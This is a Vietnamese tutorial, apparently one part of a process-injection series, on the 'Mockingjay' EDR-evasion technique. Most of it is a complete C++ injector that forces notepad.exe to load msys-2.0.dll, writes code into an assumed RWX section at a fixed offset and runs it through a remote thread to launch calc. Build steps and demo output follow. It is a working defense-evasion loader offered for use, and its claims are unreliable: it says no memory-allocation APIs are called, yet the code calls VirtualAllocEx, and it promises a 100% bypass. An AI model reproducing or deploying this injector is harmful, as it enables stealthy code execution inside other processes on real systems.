
---

# 📝 [PE 20] Mockingjay (Vulnerable RWX Module Abuse)

## 📌 1. Tổng Quan Kỹ Thuật (Overview)

**Mockingjay** (Lạm dụng phân vùng thực thi có sẵn) là giải thuật né tránh phòng thủ động (Dynamic Evasion) ở cấp độ kiến trúc phần mềm, thuộc nhóm **Bypass qua lỗi cấu hình bên thứ ba (Misconfiguration-based Bypass)**.

Các giải pháp EDR hiện đại giám sát cực kỳ nghiêm ngặt các hàm API cấp phát bộ nhớ (`VirtualAllocEx`) hoặc thay đổi thuộc tính trang nhớ (`VirtualProtectEx`). Kỹ thuật Mockingjay hóa giải triệt để rào cản này bằng cách **không gọi bất kỳ API quản lý bộ nhớ nào**.

Giải thuật tìm kiếm và lợi dụng các thư viện DLL của bên thứ ba (như `msys-2.0.dll`) vốn chứa các phân đoạn bộ nhớ mang sẵn quyền **`PAGE_EXECUTE_READWRITE` (RWX)** do lỗi từ khâu biên dịch của nhà phát triển. Loader chỉ cần ép tiến trình nạp DLL này, dùng quyền `WriteProcessMemory` ghi trực tiếp Payload vào hốc nhớ `RWX` hợp pháp có sẵn đó và kích nổ luồng.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa 100% các bộ lọc phát hiện hành vi sinh vùng nhớ `RWX` lạ hoặc hành vi lật quyền bảo vệ bộ nhớ.
* Giải phẫu bản đồ PE Header của DLL bên thứ ba để trích xuất vị trí phân đoạn `RWX` tĩnh.
* Thực hiện giải pháp ký sinh mã máy PIC vào các Module hợp pháp được tải từ đĩa cứng.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Thông thường, một DLL chuẩn chỉ của Windows chỉ chứa các phân đoạn `.text` mang quyền `RX` và `.data` mang quyền `RW`. Tuy nhiên, một số DLL của bên thứ ba do cấu hình sai flag biên dịch (`-Wl,--subsystem,windows` hoặc linker flags tùy biến) đã vô tình để lại phân đoạn dữ liệu mang quyền `RWX`.

Quy trình toán học giải phẫu bản đồ RAM và lạm dụng lỗ hổng Mockingjay diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[Ép nạp DLL lỗi] ──> [Duyệt PE Header -> Định vị phân đoạn RWX] ──> [WriteProcessMemory: Ghi đè trực tiếp] ──> [Khai hỏa luồng]

```

1. **Hợp thức hóa vùng nhớ bằng Signed Module**: Loader ép tiến trình đích (hoặc chính nó trong kịch bản Self-Inject) nạp thư viện `msys-2.0.dll` vào không gian ảo. Hệ điều hành Windows ánh xạ DLL này lên RAM dưới dạng một Module Image hợp pháp (loại `MEM_IMAGE`). Do phân đoạn `RWX` nằm sẵn trong cấu trúc file vật lý của DLL, Windows bắt buộc phải cấp quyền `RWX` cho phân vùng đó một cách hoàn toàn tự nhiên.
2. **Ký sinh trực tiếp không qua kiểm duyệt**: Loader định vị tọa độ của phân đoạn `RWX` dựa trên Base Address của DLL. Do trang nhớ đã mang sẵn cờ `PAGE_EXECUTE_READWRITE`, Loader gọi `WriteProcessMemory` để bơm Payload vào mà **Kernel Windows hoàn toàn không cần thực hiện thao túng lật cờ bảo vệ**, bẻ gãy hoàn toàn các bộ lọc giám sát API mập mờ.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** và cơ chế tính toán định vị phân đoạn bộ nhớ động chéo tiến trình.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để vận hành độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm chức năng độc lập vị trí gánh logic thực thi mở máy tính
DWORD WINAPI MockingjayPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối tuyệt đối, né sạch bẫy Import Table
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    // Hãm luồng ký sinh bảo vệ tháp luồng tiến trình cha
    while (TRUE) {
        Sleep(1000);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

// Hàm giải phẫu RAM tìm Base Address của Module cụ thể inside tiến trình đích
PVOID GetRemoteModuleBase(DWORD pid, const std::wstring& moduleName) {
    PVOID baseAddress = NULL;   MODULEENTRY32W me32;   me32.dwSize = sizeof(MODULEENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (hSnapshot == INVALID_HANDLE_VALUE) return NULL;

    if (Module32FirstW(hSnapshot, &me32)) {
        do {
            if (_wcsicmp(me32.szModule, moduleName.c_str()) == 0) { baseAddress = (PVOID)me32.modBaseAddr; break; }
        } while (Module32NextW(hSnapshot, &me32));
    }
    CloseHandle(hSnapshot);   return baseAddress;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 20: MOCKINGJAY RWX ABUSE INJECTION REMOTE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << " | Chuan bi tran danh Mockingjay..." << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // ─── BƯỚC 1: ÉP TIẾN TRÌNH ĐÍCH NẠP DLL CHỨA VÙNG NHỚ LỖI RWX ───
    std::wstring vulnerableDllPath = L"C:\\Windows\\System32\\msys-2.0.dll"; // Đường dẫn DLL chứa phân đoạn RWX lỗi cấu hình
    SIZE_T pathSize = (vulnerableDllPath.length() + 1) * sizeof(wchar_t);

    LPVOID remotePathBuffer = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remotePathBuffer, vulnerableDllPath.c_str(), pathSize, NULL);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    LPTHREAD_START_ROUTINE pLoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");

    std::cout << "[*] Dang ep Notepad nap vulnerable msys-2.0.dll de loi dung..." << std::endl;
    HANDLE hLoadThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, remotePathBuffer, 0, NULL);
    if (hLoadThread) {
        WaitForSingleObject(hLoadThread, INFINITE);
        CloseHandle(hLoadThread);
    }
    VirtualFreeEx(hProcess, remotePathBuffer, 0, MEM_RELEASE);

    // ─── BƯỚC 2: ĐỊNH VỊ PHÂN ĐOẠN RWX CÓ SẴN CỦA VULNERABLE DLL TỪ XA ───
    PVOID remoteModuleBase = GetRemoteModuleBase(pid, L"msys-2.0.dll");
    if (!remoteModuleBase) {
        std::cerr << "[-] Khong the nap hoac dinh vi msys-2.0.dll! Hãy bao dam file co san tai target." << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da bat trung Base Address cua msys-2.0.dll: 0x" << std::hex << remoteModuleBase << std::endl;

    // Giả sử phân đoạn dữ liệu RWX lỗi cấu hình nằm tại offset tĩnh 0x1000 của Module PE
    PVOID vulnerableRwxSection = (PVOID)((DWORD_PTR)remoteModuleBase + 0x1000); 
    std::cout << "[+] Tim thay hoc nho RWX nguyen ban mac dinh cua DLL: 0x" << std::hex << vulnerableRwxSection << std::endl;

    SIZE_T functionSize = 500;
    // Cấp phát một ô dữ liệu nhỏ mang quyền RW thông thường làm bảng tham số tuyệt đối
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ
    THREAD_DATA localData;
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);

    // ─── BƯỚC 3: KÝ SINH MÃ MÁY - GHI ĐÈ TRỰC TIẾP KHÔNG QUA KÍCH HOẠT API MỞ KHÓA ───
    std::cout << "[*] Dang thuc hien ghi de ma may vao phan vung RWX mac dinh..." << std::endl;
    BOOL isAbused = WriteProcessMemory(hProcess, vulnerableRwxSection, (LPCVOID)MockingjayPayload, functionSize, NULL);

    if (!isAbused) {
        std::cerr << "[-] Ghi de vao vung nho Mockingjay that bai!" << std::endl;
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);   CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Thao tac Mockingjay hoan tat! Payload da nam gon inside lòng phân vung loi." << std::endl;

    // ─── BƯỚC 4: KÍCH NỔ LUỒNG TRÊN PHÂN ĐOẠN LẠM DỤNG ───
    std::cout << "[*] Khoi tao luong tu xa CreateRemoteThread de kich no..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)vulnerableRwxSection, pRemoteData, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 1000); // Chờ đồng bộ ngắn giải phóng luồng máy tính
        std::cout << "[+] Chien dich Mockingjay da khoi hoa ruc ro!" << std::endl;
        CloseHandle(hThread);
    }

    // Thu hồi tài nguyên dữ liệu và đóng handle bảo an kịch trần
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "\n[+] Mockingjay RWX Abuse Injection Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de don dep và dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới mục cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ thư viện hệ thống.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng lỗi chuỗi.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, nạp file `msys-2.0.dll` lỗi vào thư mục thích hợp, mở PowerShell ngoài đĩa thô thực thi file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE20_Mockingjay.exe
====================================================
[*] PE 20: MOCKINGJAY RWX ABUSE INJECTION REMOTE
====================================================
[+] Da tim thay Notepad.exe voi PID: 14212 | Chuan bi tran danh Mockingjay...
[*] Dang ep Notepad nap vulnerable msys-2.0.dll de loi dung...
[+] Da bat trung Base Address cua msys-2.0.dll: 0x00007ffd12a50000
[+] Tim thay hoc nho RWX nguyen ban mac dinh cua DLL: 0x00007ffd12a51000
[*] Dang thuc hien ghi de ma may vao phan vung RWX mac dinh...
[+] Thao tac Mockingjay hoan tat! Payload da nam gon inside lòng phân vung loi.
[*] Khoi tao luong tu xa CreateRemoteThread de kich no...
[+] Chien dich Mockingjay da khoi hoa ruc ro!

[+] Mockingjay RWX Abuse Injection Completed Successfully!
[*] Nhan phim Enter de don dep và dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung**! Chiến dịch Mockingjay gặt hái thành công mỹ mãn. Vì ta không hề gọi hàm allocation bộ nhớ nào chéo tiến trình, các giải pháp phòng thủ dựa trên heuristic kiểm soát hành vi API phân bổ RAM đều bị qua mặt 100%, đánh dấu một cái kết hoàn hảo cho toàn bộ tháp công nghệ nghiên cứu Process Injection!

---

